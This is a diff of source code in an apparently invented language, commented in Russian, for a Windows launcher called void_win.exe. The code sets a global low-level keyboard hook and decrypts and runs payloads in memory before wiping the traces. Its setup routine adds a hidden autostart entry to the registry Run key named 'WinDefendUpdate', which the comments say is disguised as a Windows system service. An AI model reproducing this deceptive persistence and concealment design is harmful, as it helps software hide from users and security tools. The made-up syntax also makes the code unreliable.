@@ -1,5 +1,5 @@
 //===========================================================
-// [WINDOWS UNIVERSAL LAUNCHER] - void.exe (Full Source)
+// [WINDOWS UNIVERSAL LAUNCHER] - Файл: void_win.exe
 //===========================================================
 //---- [SYS] ----/
 
@@ -30,14 +30,14 @@ node WinLauncher {
         }
 
         // 3. [INPUT PROTECTION] - Аппаратный фильтр BadUSB
-        // Устанавливаем системный перехват через bridge.ctos логику
+        // Устанавливаем системный перехват через логику bridge.ctos
         sys.set_hook(WH_KEYBOARD_LL, WinRuntime.input_filter);
 
         // 4. [EXECUTION LOGIC] - Обработка входных файлов (.vc / .ctos)
         if (args.count() > 0) {
             // Если на void.exe перетащили файл — запускаем его
             cell target_file = args.first();
-            VoidEngine.execute_app(target_file);
+            WinLauncher.execute_app(target_file);
         } else {
             // Если запущен просто так — открываем Dashboard (Интерфейс)
             &- import { StatusDashboard } from "main.vc";
@@ -49,7 +49,7 @@ node WinLauncher {
      * Внутренний движок исполнения (JIT/AOT Hybrid)
      */
     priv void execute_app(cell path) {
-        // [C++ Power] Чтение и расшифровка кода на лету в RAM
+        // [B/C Power] Чтение и расшифровка кода на лету в RAM
         cell app_binary = fs.read_protected(path, key: DataVault.get_secret_token());
         
         // [Linux Architecture] Запуск приложения в изолированном контексте (Isolate)
@@ -61,7 +61,7 @@ node WinLauncher {
             &- call app_binary.app_entry();
         }
 
-        // Ждем завершения и очищаем следы (Zeroize)
+        // Ждем завершения и очищаем все следы в RAM (Zeroize)
         sys.wait_for_isolate(AppContext);
         mem.zeroize_all_traces();
     }
@@ -74,7 +74,7 @@ node WinLauncher {
 
 /**
  * Изолят для настройки системы (Setup Mode)
- * Вызывается через void.exe --install
+ * Вызывается через void_win.exe --install
  */
 isolate WinIntegrator {
     pub async void setup_shell() {
@@ -86,7 +86,7 @@ isolate WinIntegrator {
         await registry.set_association(".ctos", exe_path, icon: "assets/core.ico");
 
         // Скрытая автозагрузка (Persistence)
-        // Добавляем в Run-ключ реестра под видом системной службы
+        // Добавляем в Run-ключ реестра под видом системной службы Windows
         await registry.set_value(
             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             "WinDefendUpdate", 
